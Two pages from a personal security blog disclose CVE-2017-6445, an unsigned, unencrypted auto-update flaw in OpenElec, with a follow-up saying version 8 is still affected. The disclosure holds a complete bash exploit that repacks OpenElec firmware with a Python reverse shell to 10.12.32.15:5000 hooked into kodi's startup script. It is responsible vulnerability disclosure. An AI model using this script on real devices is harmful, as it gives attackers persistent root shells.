=== Content from tech.feedyourhead.at_23a70ca0_20250125_101427.html ===

[FYHTECH](/)

FUN WITH LINUX

* [Blog](/)
* [Friends](/friends)
* [GPG](/gpgkey)
* [CVE](/tag/cve)

[OpenElec: CVE-2017-6445 revisited](/content/openelec-cve-2017-6445-revisited)

25 June 2017

A few months ago I [published a vulnerability in OpenElecs updater](https://tech.feedyourhead.at/content/openelec-remote-code-execution-vulnerability-through-man-in-the-middle). I successfully hacked remotely OpenElec version 6.x.x and 7.x.x . OpenElec 8 is available for a while and [reached version 8.0.4](http://openelec.tv/news/22-releases/188-stable-openelec-8-0-4-released). So I tested the bug against this version and itâs still open. An attacker who is Man-In-The-Middle can remotely compromise Openelec-Updates and plant a reverse-shell on the target.

[
[`Security`](/tag/security)
]

![User image](/assets/images/aboutme.webp)

My name is Wolfgang Hotwagner. I am a Linux and Information Security enthusiast from Vienna. This blog is about my journey through Computer Science.

# Tag Cloud

[Puppet](/tag/puppet)
[Zsh](/tag/zsh)
[C](/tag/c)
[xmas](/tag/xmas)
[LVM](/tag/lvm)
[openssl](/tag/openssl)
[Tricks](/tag/tricks)
[Open-Source](/tag/open-source)
[Ruby](/tag/ruby)
[Virtualization](/tag/virtualization)
[Programming](/tag/programming)
[CVE](/tag/cve)
[Linux](/tag/linux)
[Mail](/tag/mail)
[Ansible](/tag/ansible)
[Btrfs](/tag/btrfs)
[git](/tag/git)
[Suricata](/tag/suricata)
[PHP](/tag/php)
[Proxy](/tag/proxy)
[HackADay](/tag/hackaday)
[Blog](/tag/blog)
[Network](/tag/network)
[Backup](/tag/backup)
[apache](/tag/apache)
[Postgresql](/tag/postgresql)
[Certification](/tag/certification)
[ccc](/tag/ccc)
[Security](/tag/security)
[Desktop](/tag/desktop)
[Sysadmin](/tag/sysadmin)
[Email](/tag/email)
[Anniversary](/tag/anniversary)
[Firewall](/tag/firewall)
[Toscom](/tag/toscom)
[Docker](/tag/docker)
[News](/tag/news)
[Downloads](/tag/downloads)
[External](/tag/external)
[Crypto](/tag/crypto)
[Shell](/tag/shell)
[Kernel](/tag/kernel)
[Debian](/tag/debian)
[Software-Raid](/tag/software-raid)
[Mathematics](/tag/mathematics)
[Hardware](/tag/hardware)
[Fun](/tag/fun)
[CLI](/tag/cli)
[Web](/tag/web)
[Nagios](/tag/nagios)
[One-Liner](/tag/one-liner)
[TerminalEmulator](/tag/terminalemulator)
[Raspberry](/tag/raspberry)
[Multimedia](/tag/multimedia)
[vim](/tag/vim)
[Database](/tag/database)
[Bash](/tag/bash)
[logrotate](/tag/logrotate)
[Perl](/tag/perl)
# Recent Posts

* [Decidim: Stored XSS in embedded URLs for Decidim Meetings](/content/decidim-stored-xss-in-embedded-urls-for-decidim-meetings/)
* [Decidim-Awesome: SQL Injection in AdminAccountability](/content/decidim-awesome-sql-injection-in-adminaccountability/)
* [AttackMate A modern open source tool for automating cyberattack](/content/attackmate-a-modern-open-source-tool-for-automating-cyberattack/)
* [BalCCon2k24 was amazing](/content/balccon2k24-was-amazing/)
* [FIWARE Keyrock: Command Injection in Organisationname](/content/fiware-keyrock-command-injection-in-organisationname/)
* [FIWARE Keyrock: Command Injection in Applicationname](/content/fiware-keyrock-command-injection-in-applicationname/)
* [FIWARE Keyrock: Activation of any new user](/content/fiware-keyrock-activation-of-any-new-user/)
* [FIWARE Keyrock: Deactivate 2-factor-auth of any user](/content/fiware-keyrock-deactivate-2-factor-auth-of-any-user/)
* [FIWARE Keyrock: Manipulate passwords of any user](/content/fiware-keyrock-manipulate-passwords-of-any-user/)
* [Contributing a Metasploit Exploit](/content/contributing-a-metasploit-exploit/)

Except where otherwise noted, content on this site is licensed under a [Creative Commons Attribution 3.0 Unported License](http://creativecommons.org/licenses/by/3.0/).

Copyright 2015-present Hoti



=== Content from tech.feedyourhead.at_195a90ac_20250126_075655.html ===

[FYHTECH](/)

FUN WITH LINUX

* [Blog](/)
* [Friends](/friends)
* [GPG](/gpgkey)
* [CVE](/tag/cve)

[OpenElec: Remote Code Execution Vulnerability through Man-In-The-Middle(CVE-2017-6445)](/content/openelec-remote-code-execution-vulnerability-through-man-in-the-middle)

3 March 2017

During my research about update mechanisms of open-source software I discovered vulnerabilities in OpenElec.

### Overview

* System affected: OpenElec
* CVE: CVE-2017-6445
* Vulnerable component: auto-update feature
* Software-Version: 6.0.3, 7.0.1
* User-Interaction: Reboot required
* Impact: Remote Code Execution with root permission

### Product Description

According to its [website](http://openelec.tv/) â**Open Embedded Linux Entertainment Center (OpenELEC)** is a small Linux based [Just Enough Operating System (JeOS)](http://en.wikipedia.org/wiki/Just_enough_operating_system) built from scratch as a platform to turn your computer into a [Kodi](http://kodi.tv) media center.â

### Vulnerability

Automatic updates are disabled by default. After enabling it, OpenElec connects to http://update.openelec.tv/updates.php to find out if there is an update for a newer version. If there is a newer version, openelec will download it from http://releases.openelec.tv/<version>.tar(or any other url returned by update.openelec.tv).

![openelec-update-schema](/assets/images/OpenElec-Update-Schema.png)

The auto-update feature of OpenElec does neither use encrypted connections nor does it use signed updates. A Man-In-The-Middle could manipulate the update-packages to gain root-access remotely.

![openelec-attac](/assets/images/OpenElec-Angriff-Schema_0.png)

In order to run the downloaded firmware, the OpenElec-system has to be rebooted. So at this point user-interaction is required.

### Exploit

The following code downloads an openelec-firmware, extracts it, places a reverse-shell into the kodi-startscript and finally generates a backdoored firmware:

```
#!/bin/bash

OPENELEC="OpenELEC-RPi2.arm-7.0.1"
DOWNLOADURL="http://releases.openelec.tv/"

TMP="/tmp"

cd $TMP
test -e ${OPENELEC}.tar || wget $DOWNLOADURL/${OPENELEC}.tar
test -d $OPENELEC || tar xvf ${OPENELEC}.tar

test -d $TMP/unpacked || mkdir $TMP/unpacked
cd $TMP/unpacked
test -d $TMP/unpacked/squashfs-root || unsquashfs $TMP/$OPENELEC/target/SYSTEM

cat > $TMP/unpacked/squashfs-root/usr/bin/revshell.sh << EOF
#!/bin/bash

while true
do
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.12.32.15",5000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > /dev/null 2>&1
done
EOF

chmod 777 $TMP/unpacked/squashfs-root/usr/bin/revshell.sh

awk '/trap cleanup TERM/ { print; print "/usr/bin/revshell.sh &"; next }1' $TMP/unpacked/squashfs-root/usr/lib/kodi/kodi.sh > $TMP/unpacked/squashfs-root/usr/lib/kodi/kodievil.sh
mv $TMP/unpacked/squashfs-root/usr/lib/kodi/kodievil.sh $TMP/unpacked/squashfs-root/usr/lib/kodi/kodi.sh
chmod 777 $TMP/unpacked/squashfs-root/usr/lib/kodi/kodi.sh

mksquashfs squashfs-root/ SYS -noappend -comp gzip

mv SYS $TMP/$OPENELEC/target/SYSTEM
cd $TMP/$OPENELEC
md5sum target/SYSTEM > target/SYSTEM.md5
cd $TMP
tar cvf $OPENELEC.evil.tar $OPENELEC

test -d $TMP/unpacked && rm -fr $TMP/unpacked
test -d $OPENELEC && rm -rf $OPENELEC

```
### Mitigation

Ensure that auto-update is disabled.

### Timeline

* This bug was reported on December 03 2016.
* Published as Zero-Day after no reply from OpenElec on March 04 2017

### Credits

CVE-2017-6445 was discovered by Wolfgang Hotwagner ([https://tech.feedyourhead.at/content/openelec-remote-code-execution-vulnerability-through-man-in-the-middle)](https://tech.feedyourhead.at/content/openelec-remote-code-execution-vulnerability-through-man-in-the-middle)

[
[`Security`](/tag/security)
[`OpenElec`](/tag/openelec)
[`CVE`](/tag/cve)
]

![User image](/assets/images/aboutme.webp)

My name is Wolfgang Hotwagner. I am a Linux and Information Security enthusiast from Vienna. This blog is about my journey through Computer Science.

# Tag Cloud

[Downloads](/tag/downloads)
[Debian](/tag/debian)
[Puppet](/tag/puppet)
[Backup](/tag/backup)
[Raspberry](/tag/raspberry)
[git](/tag/git)
[Database](/tag/database)
[Anniversary](/tag/anniversary)
[Ansible](/tag/ansible)
[Programming](/tag/programming)
[Btrfs](/tag/btrfs)
[Bash](/tag/bash)
[One-Liner](/tag/one-liner)
[Open-Source](/tag/open-source)
[ccc](/tag/ccc)
[Mail](/tag/mail)
[Virtualization](/tag/virtualization)
[logrotate](/tag/logrotate)
[Security](/tag/security)
[TerminalEmulator](/tag/terminalemulator)
[Toscom](/tag/toscom)
[LVM](/tag/lvm)
[CVE](/tag/cve)
[CLI](/tag/cli)
[apache](/tag/apache)
[openssl](/tag/openssl)
[News](/tag/news)
[Desktop](/tag/desktop)
[Sysadmin](/tag/sysadmin)
[vim](/tag/vim)
[HackADay](/tag/hackaday)
[Multimedia](/tag/multimedia)
[Fun](/tag/fun)
[Proxy](/tag/proxy)
[Certification](/tag/certification)
[C](/tag/c)
[Postgresql](/tag/postgresql)
[Web](/tag/web)
[Linux](/tag/linux)
[Shell](/tag/shell)
[Tricks](/tag/tricks)
[Nagios](/tag/nagios)
[Hardware](/tag/hardware)
[Ruby](/tag/ruby)
[Kernel](/tag/kernel)
[Software-Raid](/tag/software-raid)
[Email](/tag/email)
[xmas](/tag/xmas)
[Perl](/tag/perl)
[Crypto](/tag/crypto)
[PHP](/tag/php)
[Zsh](/tag/zsh)
[Blog](/tag/blog)
[Firewall](/tag/firewall)
[External](/tag/external)
[Network](/tag/network)
[Mathematics](/tag/mathematics)
[Suricata](/tag/suricata)
[Docker](/tag/docker)
# Recent Posts

* [Decidim: Stored XSS in embedded URLs for Decidim Meetings](/content/decidim-stored-xss-in-embedded-urls-for-decidim-meetings/)
* [Decidim-Awesome: SQL Injection in AdminAccountability](/content/decidim-awesome-sql-injection-in-adminaccountability/)
* [AttackMate A modern open source tool for automating cyberattack](/content/attackmate-a-modern-open-source-tool-for-automating-cyberattack/)
* [BalCCon2k24 was amazing](/content/balccon2k24-was-amazing/)
* [FIWARE Keyrock: Command Injection in Organisationname](/content/fiware-keyrock-command-injection-in-organisationname/)
* [FIWARE Keyrock: Command Injection in Applicationname](/content/fiware-keyrock-command-injection-in-applicationname/)
* [FIWARE Keyrock: Activation of any new user](/content/fiware-keyrock-activation-of-any-new-user/)
* [FIWARE Keyrock: Deactivate 2-factor-auth of any user](/content/fiware-keyrock-deactivate-2-factor-auth-of-any-user/)
* [FIWARE Keyrock: Manipulate passwords of any user](/content/fiware-keyrock-manipulate-passwords-of-any-user/)
* [Contributing a Metasploit Exploit](/content/contributing-a-metasploit-exploit/)

Except where otherwise noted, content on this site is licensed under a [Creative Commons Attribution 3.0 Unported License](http://creativecommons.org/licenses/by/3.0/).

Copyright 2015-present Hoti


